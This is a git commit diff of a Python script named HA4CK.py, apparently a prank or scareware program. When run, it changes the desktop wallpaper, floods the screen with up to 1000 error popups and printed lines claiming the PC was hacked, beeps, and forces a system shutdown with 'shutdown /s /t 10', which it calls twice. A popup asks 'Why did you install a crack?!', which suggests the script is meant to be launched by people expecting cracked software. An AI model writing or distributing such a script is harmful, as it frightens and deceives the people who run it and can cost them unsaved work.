455f6cfd256dca7d53d010f5a719ccc8fba098b8
rx550x <150556636+HOSAM-ALOMARI@users.noreply.github.com>
2024-12-28 22:12:38 +0300

    Add files via upload

--- HA4CK.py
+++ HA4CK.py
@@ -13,13 +13,13 @@ def change_wallpaper(image_path):
     try:
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
         for _ in range(1000):  
-            print("Your PC was hacked! Don't turn it on again, LOL")
+            show_message("Warning", "Why did you install a crack?!")
     except Exception as e:
         show_message("Error", f"Failed to change wallpaper: {e}")
-
+        
 def shutdown_pc():
-    winsound.Beep(440, 1000) 
-    winsound.Beep(660, 1000)
+    winsound.Beep(440, 1000)  
+    winsound.Beep(660, 1000) 
     subprocess.run("shutdown /s /t 10", shell=True)  
 
 def show_message(title, message):
@@ -28,5 +28,9 @@ def show_message(title, message):
     messagebox.showerror(title, message)  
 
 image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"  
-change_wallpaper(image_path) 
-shutdown_pc()  
+for _ in range(1000):  
+    print("your pc was hacking dont turn on again lol")
+change_wallpaper(image_path)
+shutdown_pc()
+
+shutdown_pc()
